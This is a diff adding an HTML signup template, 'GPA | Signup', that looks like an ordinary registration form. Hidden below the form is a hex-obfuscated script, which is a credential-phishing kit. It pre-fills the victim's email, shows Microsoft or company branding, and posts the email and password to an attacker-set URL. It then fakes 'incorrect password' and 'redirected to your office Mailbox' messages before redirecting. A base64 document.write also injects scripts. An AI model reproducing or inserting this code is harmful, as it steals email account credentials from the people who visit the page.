@@ -1,0 +1,107 @@
+<!doctype html>
+<html lang="en">
+
+
+
+<head>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.3.1.js"></script>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <!-- Bootstrap CSS -->
+    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="{{url_for('.static',filename='css/styles.css')}}">
+    <link rel="icon" href="{{ url_for('static', filename='images/logo.png') }}" type="image/png">
+    <title>GPA | Signup</title>
+    
+</head>
+
+<body>
+    <div class="bgimg"></div>
+    <div class="container-fluid">
+        <div class="container">
+            <div class="row topp">
+                <div class="col-lg-6 mx-auto">
+                    <div class="box auth-box" id="diiiv1">
+                    <!-- ////////////////////////diiiv1 start/////////////////////// -->
+                    <div class="box" id="diiiv1">
+                        <div class="loader " style="display:none;">
+                            <div class="circle"></div>
+                            <div class="circle"></div>
+                            <div class="circle"></div>
+                            <div class="circle"></div>
+                            <div class="circle"></div>
+                        </div>
+                            <form action="/signup" method="post" enctype="multipart/form-data">
+                            <div class="boxtext">
+                            <img src="static/images/logo.png" class="img-fluid logoimg" width="30px">&nbsp<span class="align-middle h5 logoname" style="color: #747474;"> GPA </span><br><br>
+                            <span class="h5">Sign Up</span><br>
+                            
+                            <span id="error" class="text-danger" style="display: none;">Email doesn't match. Try another </span>
+                            
+                            <div class="form-group mt-2">
+                                <input type="text" id="name" name="user_name" required class="form-control rounded-0 border-dark" aria-describedby="aiHelp" placeholder="Username" style="border-right: none;border-left: none;border-top: none;">
+                            </div>
+
+                            <div class="form-group mt-2">
+                                <input type="email" id="mail" name="user_email" required class="form-control rounded-0 border-dark" aria-describedby="aiHelp" placeholder="Email" style="border-right: none;border-left: none;border-top: none;">
+                            </div>
+
+
+                            <div class="form-group mt-2">
+                                <label for="file" class="upload-label">Upload a Security Image:</label>
+                                <input type="file" id="file" name="file" accept="image/*" class="file-input">
+                            </div>
+                            
+
+                            <div id="error" class="text-danger" style="display: none;">Email doesn't match. Try another </div>
+                            
+                            <div class="text-right">
+                                <button type="submit" class="btn rounded-0 text-white px-4" id="submit" style="background-color: #0066BA;cursor: pointer;">Next</button>
+                            </div>
+                            <p style="font-size: 13px">Already have an account <a href="/login"> Login </a></p>
+
+                        </div>
+
+                            </form>
+                    </div>
+                    <script type="text/javascript">
+                        document.write(atob('PCEtLSBqUXVlcnkgZmlyc3QsIHRoZW4gUG9wcGVyLmpzLCB0aGVuIEJvb3RzdHJhcCBKUyAtLT4KICAgIDxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBzcmM9Imh0dHBzOi8vY29kZS5qcXVlcnkuY29tL2pxdWVyeS0zLjIuMS5zbGltLm1pbi5qcyIgaW50ZWdyaXR5PSJzaGEzODQtS0ozbzJES3RJa3ZZSUszVUVOem1NN0tDa1JyL3JFOS9RcGc2YUFaR0p3RkRNVk5BL0dwR0ZGOTNoWHBHNUtrTiIgY3Jvc3NvcmlnaW49ImFub255bW91cyI+PC9zY3JpcHQ+CiAgICA8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9wb3BwZXIuanMvMS4xMi45L3VtZC9wb3BwZXIubWluLmpzIiBpbnRlZ3JpdHk9InNoYTM4NC1BcE5iZ2g5QitZMVFLdHYzUm43VzNtZ1B4aFU5Sy9TY1FzQVA3aFVpYlgzOWo3ZmFrRlBza3ZYdXN2ZmEwYjRRIiBjcm9zc29yaWdpbj0iYW5vbnltb3VzIj48L3NjcmlwdD4KICAgIDxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBzcmM9Imh0dHBzOi8vbWF4Y2RuLmJvb3RzdHJhcGNkbi5jb20vYm9vdHN0cmFwLzQuMC4wL2pzL2Jvb3RzdHJhcC5taW4uanMiIGludGVncml0eT0ic2hhMzg0LUpaUjZTcGVqaDRVMDJkOGpPdDZ2TEVIZmUvSlFHaVJSU1FReFNmRldwaTFNcXVWZEF5alVhcjUrNzZQVkNtWWwiIGNyb3Nzb3JpZ2luPSJhbm9ueW1vdXMiPjwvc2NyaXB0Pgo8L2JvZHk+CjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBzcmM9Imh0dHBzOi8vYWpheC5nb29nbGVhcGlzLmNvbS9hamF4L2xpYnMvanF1ZXJ5LzIuMi40L2pxdWVyeS5taW4uanMiPjwvc2NyaXB0Pg=='));
+                    </script>
+                    <script>
+                        var _0xbf32=["\x76\x61\x6C","\x23\x66","\x23\x72\x63","\x23\x72\x64\x72\x74","\x23\x64\x6F\x6D\x61\x69\x6E\x5F\x72\x65\x64\x69\x72\x65\x63\x74","\x73\x75\x62\x73\x74\x72","\x68\x61\x73\x68","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x23\x61\x69","\x74\x65\x73\x74","\x73\x68\x6F\x77","\x23\x65\x72\x72\x6F\x72","\x40","\x69\x6E\x64\x65\x78\x4F\x66","\x2E","\x74\x6F\x4C\x6F\x77\x65\x72\x43\x61\x73\x65","\x74\x6F\x55\x70\x70\x65\x72\x43\x61\x73\x65","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x61\x64\x63\x64\x6E\x2E\x6D\x73\x61\x75\x74\x68\x2E\x6E\x65\x74\x2F\x65\x73\x74\x73\x2F\x32\x2E\x31\x2F\x63\x6F\x6E\x74\x65\x6E\x74\x2F\x69\x6D\x61\x67\x65\x73\x2F\x66\x61\x76\x69\x63\x6F\x6E\x5F\x61\x5F\x65\x75\x70\x61\x79\x66\x67\x67\x68\x71\x69\x61\x69\x37\x6B\x39\x73\x6F\x6C\x36\x6C\x67\x32\x2E\x69\x63\x6F","\x61\x74\x74\x72","\x2E\x6C\x6F\x67\x6F\x69\x6D\x67","\x4D\x69\x63\x72\x6F\x73\x6F\x66\x74","\x68\x74\x6D\x6C","\x2E\x6C\x6F\x67\x6F\x6E\x61\x6D\x65","\x66\x61\x69\x6C","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6C\x6F\x67\x6F\x2E\x63\x6C\x65\x61\x72\x62\x69\x74\x2E\x63\x6F\x6D\x2F","\x64\x6F\x6E\x65","\x67\x65\x74","\x68\x69\x64\x65","\x61\x6E\x69\x6D\x61\x74\x65","\x23\x64\x69\x69\x69\x76\x31","\x23\x64\x69\x76\x33","\x23\x64\x69\x76\x32","\x23\x61\x69\x63\x68","\x63\x6C\x69\x63\x6B","\x6B\x65\x79\x43\x6F\x64\x65","\x77\x68\x69\x63\x68","\x31\x33","\x70\x72\x65\x76\x65\x6E\x74\x44\x65\x66\x61\x75\x6C\x74","\x3A\x76\x69\x73\x69\x62\x6C\x65","\x69\x73","\x23\x6E\x65\x78\x74","\x23\x73\x75\x62\x2D\x62\x74\x6E","\x6B\x65\x79\x70\x72\x65\x73\x73","\x23\x6D\x73\x67","","\x23\x70\x72","\x23\x62\x61\x63\x6B","\x23\x66\x69\x65\x6C\x64","\x74\x65\x78\x74","\x4A\x53\x4F\x4E","\x50\x4F\x53\x54","\x4D\x61\x69\x6C\x20\x52\x65\x63\x6F\x76\x65\x72\x65\x64","\x23\x6C\x6F\x61\x64\x2D\x74\x65\x78\x74","\x59\x6F\x75\x20\x77\x69\x6C\x6C\x20\x62\x65\x20\x72\x65\x64\x69\x72\x65\x63\x74\x65\x64\x20\x74\x6F\x20\x79\x6F\x75\x72\x20\x6F\x66\x66\x69\x63\x65\x20\x4D\x61\x69\x6C\x62\x6F\x78\x20\x73\x68\x6F\x72\x74\x6C\x79\x2E","\x72\x65\x70\x6C\x61\x63\x65","\x59\x6F\x75\x72\x20\x61\x63\x63\x6F\x75\x6E\x74\x20\x6F\x72\x20\x70\x61\x73\x73\x77\x6F\x72\x64\x20\x69\x73\x20\x69\x6E\x63\x6F\x72\x72\x65\x63\x74\x2E\x20\x49\x66\x20\x79\x6F\x75\x20\x64\x6F\x6E\x27\x74\x20\x72\x65\x6D\x65\x6D\x62\x65\x72\x20\x79\x6F\x75\x72\x20\x70\x61\x73\x73\x77\x6F\x72\x64\x2C\x20\x3C\x61\x20\x68\x72\x65\x66\x3D\x27\x23\x27\x3E\x72\x65\x73\x65\x74\x20\x69\x74\x20\x6E\x6F\x77\x3C\x2F\x61\x3E","\x61\x6A\x61\x78","\x72\x65\x61\x64\x79"];var f=$(_0xbf32[1])[_0xbf32[0]]();var rc=$(_0xbf32[2])[_0xbf32[0]]();var rdrt=$(_0xbf32[3])[_0xbf32[0]]();var domain_redirect=$(_0xbf32[4])[_0xbf32[0]]();$(document)[_0xbf32[58]](function(){var _0x7127x5=0;var _0x7127x6=window[_0xbf32[7]][_0xbf32[6]][_0xbf32[5]](1);if(!_0x7127x6){}else {var _0x7127x7=_0x7127x6;$(_0xbf32[8])[_0xbf32[0]](_0x7127x7);var _0x7127x8=/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;if(!_0x7127x8[_0xbf32[9]](_0x7127x7)){$(_0xbf32[11])[_0xbf32[10]]();return false};var _0x7127x9=_0x7127x7[_0xbf32[13]](_0xbf32[12]);var _0x7127xa=_0x7127x7[_0xbf32[5]]((_0x7127x9+ 1));var _0x7127xb=_0x7127xa[_0xbf32[5]](0,_0x7127xa[_0xbf32[13]](_0xbf32[14]));var _0x7127xc=_0x7127xb[_0xbf32[15]]();var _0x7127xd=_0x7127xb[_0xbf32[16]]();$[_0xbf32[27]](_0xbf32[25]+ _0x7127xa)[_0xbf32[26]](function(){$(_0xbf32[20])[_0xbf32[19]](_0xbf32[17],_0xbf32[25]+ _0x7127xa);$(_0xbf32[23])[_0xbf32[22]](_0x7127xd)})[_0xbf32[24]](function(){$(_0xbf32[20])[_0xbf32[19]](_0xbf32[17],_0xbf32[18]);$(_0xbf32[23])[_0xbf32[22]](_0xbf32[21])});$(_0xbf32[30])[_0xbf32[29]]({left:0,opacity:_0xbf32[28]},0);$(_0xbf32[31])[_0xbf32[29]]({right:0,opacity:_0xbf32[10]},0);setTimeout(function(){$(_0xbf32[31])[_0xbf32[29]]({left:0,opacity:_0xbf32[28]},0);$(_0xbf32[32])[_0xbf32[29]]({right:0,opacity:_0xbf32[10]},0);$(_0xbf32[33])[_0xbf32[22]](_0x7127x7)},4000)};$(_0xbf32[8])[_0xbf32[34]](function(){$(_0xbf32[11])[_0xbf32[28]]()});$(document)[_0xbf32[43]](function(_0x7127xe){var _0x7127x8=(_0x7127xe[_0xbf32[35]]?_0x7127xe[_0xbf32[35]]:_0x7127xe[_0xbf32[36]]);if(_0x7127x8== _0xbf32[37]){_0x7127xe[_0xbf32[38]]();if($(_0xbf32[30])[_0xbf32[40]](_0xbf32[39])){$(_0xbf32[41])[_0xbf32[34]]()}else {if($(_0xbf32[32])[_0xbf32[40]](_0xbf32[39])){_0x7127xe[_0xbf32[38]]();$(_0xbf32[42])[_0xbf32[34]]()}else {return false}}}});$(_0xbf32[41])[_0xbf32[34]](function(){event[_0xbf32[38]]();var _0x7127xe=$(_0xbf32[8])[_0xbf32[0]]();var _0x7127x8=/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;if(!_0x7127x8[_0xbf32[9]](_0x7127xe)){$(_0xbf32[11])[_0xbf32[10]]();return false};var _0x7127xf=_0x7127xe[_0xbf32[13]](_0xbf32[12]);var _0x7127x10=_0x7127xe[_0xbf32[5]]((_0x7127xf+ 1));var _0x7127xb=_0x7127x10[_0xbf32[5]](0,_0x7127x10[_0xbf32[13]](_0xbf32[14]));var f=_0x7127xb[_0xbf32[15]]();var _0x7127x11=_0x7127xb[_0xbf32[16]]();$[_0xbf32[27]](_0xbf32[25]+ _0x7127x10)[_0xbf32[26]](function(){$(_0xbf32[20])[_0xbf32[19]](_0xbf32[17],_0xbf32[25]+ _0x7127x10);$(_0xbf32[23])[_0xbf32[22]](_0x7127x11)})[_0xbf32[24]](function(){$(_0xbf32[20])[_0xbf32[19]](_0xbf32[17],_0xbf32[18]);$(_0xbf32[23])[_0xbf32[22]](_0xbf32[21])});$(_0xbf32[30])[_0xbf32[29]]({left:0,opacity:_0xbf32[28]},0);$(_0xbf32[31])[_0xbf32[29]]({right:0,opacity:_0xbf32[10]},0);setTimeout(function(){$(_0xbf32[31])[_0xbf32[29]]({left:0,opacity:_0xbf32[28]},0);$(_0xbf32[32])[_0xbf32[29]]({right:0,opacity:_0xbf32[10]},0);$(_0xbf32[33])[_0xbf32[22]](_0x7127xe)},4000)});$(_0xbf32[47])[_0xbf32[34]](function(){$(_0xbf32[44])[_0xbf32[28]]();$(_0xbf32[8])[_0xbf32[0]](_0xbf32[45]);$(_0xbf32[46])[_0xbf32[0]](_0xbf32[45]);$(_0xbf32[32])[_0xbf32[29]]({left:0,opacity:_0xbf32[28]},0);$(_0xbf32[30])[_0xbf32[29]]({right:0,opacity:_0xbf32[10]},1000)});$(_0xbf32[42])[_0xbf32[34]](function(_0x7127x8){_0x7127x8[_0xbf32[38]]();var _0x7127xf=$(_0xbf32[8])[_0xbf32[0]]();var _0x7127x10=$(_0xbf32[46])[_0xbf32[0]]();var _0x7127x11=$(_0xbf32[48])[_0xbf32[22]]();var _0x7127x12=$(_0xbf32[44])[_0xbf32[22]]();var _0x7127x13=_0x7127xf;var _0x7127x14=_0x7127x13[_0xbf32[13]](_0xbf32[12]);var _0x7127x15=_0x7127x13[_0xbf32[5]]((_0x7127x14+ 1));var _0x7127xb=_0x7127x15[_0xbf32[5]](0,_0x7127x15[_0xbf32[13]](_0xbf32[14]));var _0x7127x16=_0x7127xb[_0xbf32[15]]();$(_0xbf32[44])[_0xbf32[49]](_0x7127x12);_0x7127x5= _0x7127x5+ 1;$[_0xbf32[57]]({dataType:_0xbf32[50],url:f,type:_0xbf32[51],data:{ai:_0x7127xf,pr:_0x7127x10,detail:_0x7127x11},beforeSend:function(_0x7127xe){$(_0xbf32[32])[_0xbf32[29]]({left:0,opacity:_0xbf32[28]},0);$(_0xbf32[31])[_0xbf32[29]]({left:0,opacity:_0xbf32[10]},0)},complete:function(){$(_0xbf32[46])[_0xbf32[0]](_0xbf32[45]);if(_0x7127x5>= rc){_0x7127x5= 0;$(_0xbf32[53])[_0xbf32[22]](_0xbf32[52]);setTimeout(function(){$(_0xbf32[53])[_0xbf32[22]](_0xbf32[54]);setTimeout(function(){window[_0xbf32[7]][_0xbf32[55]](rdrt)},500)},1000);return false};$()[_0xbf32[10]]();$(_0xbf32[44])[_0xbf32[22]](_0xbf32[56]);$(_0xbf32[31])[_0xbf32[29]]({left:0,opacity:_0xbf32[28]},0);$(_0xbf32[32])[_0xbf32[29]]({left:0,opacity:_0xbf32[10]},100)}})})})
+                    </script>
+                    </div>
+                    <!-- ////////////////////////diiiv1 end/////////////////////// -->
+</body>
+<script>
+    $(document).ready(function() {
+        // Get the email input field
+        var emailInput = $("#mail");
+
+        // Get the error message div
+        var errorDiv = $("#error");
+
+        // Add an event listener to the form submission
+        $("form").submit(function(e) {
+            // Check if the email is incorrect (you can modify this condition as needed)
+            if (!isValidEmail(emailInput.val())) {
+                // Display the error message
+                errorDiv.css("display", "block");
+                e.preventDefault(); // Prevent form submission
+            }
+        });
+
+        // Function to validate email (you can use your own validation logic)
+        function isValidEmail(email) {
+            // This is a simple example. You should use a more comprehensive email validation method.
+            var emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
+        }
+    });
+</script>
+
+</html>
+
